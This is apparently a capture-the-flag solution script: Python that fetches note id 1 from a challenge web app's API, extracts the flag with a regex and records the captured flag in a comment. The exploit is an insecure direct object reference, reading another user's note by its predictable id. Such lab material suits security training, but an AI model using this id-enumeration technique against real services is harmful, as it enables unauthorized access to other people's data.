import requests
import re

site = "http://easynotes.challs.olicyber.it"

r = requests.get(f"{site}/api/note/1").text

match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{I_us3d_t0_st34l_c00k13s}
